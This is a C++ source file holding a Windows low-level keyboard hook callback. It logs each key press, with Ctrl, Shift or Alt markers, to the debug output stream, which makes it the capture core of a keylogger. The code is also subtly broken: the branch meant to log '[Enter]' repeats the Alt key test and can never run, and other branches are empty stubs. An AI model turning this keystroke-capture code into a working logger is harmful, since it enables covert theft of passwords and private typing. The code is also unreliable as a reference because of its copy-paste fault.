#include "stdafx.h"


HKB_CALLBACK* volatile HKB_CALLBACK::_instance = nullptr;
std::mutex HKB_CALLBACK::HKB_mutex;

HKB_CALLBACK::HKB_CALLBACK() :_hook(nullptr)
{


}

HKB_CALLBACK::~HKB_CALLBACK()
{


}

LRESULT HKB_CALLBACK::DoHookKeyBoard(__in int code, __in WPARAM wparam, __in LPARAM lparam)
{
	KBDLLHOOKSTRUCT* HookData;

	do {
		if (code < HC_ACTION)
			break;

		HookData = (KBDLLHOOKSTRUCT*)lparam;





		if (WM_KEYDOWN == wparam)
		{
			if (0x00 < HookData->vkCode && 0xFF > HookData->vkCode)
			{
				const char key = (char)HookData->vkCode;
				std::string log_message;
				if (GetAsyncKeyState(VK_LCONTROL) & 0x8000 || GetAsyncKeyState(VK_RCONTROL) & 0x8000)
				{
					log_message.append("[Ctrl]");
				}
				else if (GetAsyncKeyState(VK_LSHIFT) & 0x8000 || GetAsyncKeyState(VK_RSHIFT) & 0x8000)
				{
					log_message.append("[Shift]");
				}
				else if (GetAsyncKeyState(VK_LMENU) & 0x8000 || GetAsyncKeyState(VK_RMENU) & 0x8000)
				{
					log_message.append("[Alt]");
				}
				else if (GetAsyncKeyState(VK_LMENU) & 0x8000 || GetAsyncKeyState(VK_RMENU) & 0x8000)
				{
					log_message.append("[Enter]");
				}
				else
				{
					// ...
				}
				if (0x30 <= HookData->vkCode && 0x5A >= HookData->vkCode)
				{
					log_message.push_back(key);
				}
				else if (VK_BACK == HookData->vkCode)
				{
					log_message.append("[Backspace]");
				}
				else
				{
					// ...
				}
				OutputDebugStringA(log_message.c_str());
			}
		}
	} while (false);

	return ::CallNextHookEx(_hook, code, wparam, lparam);
}
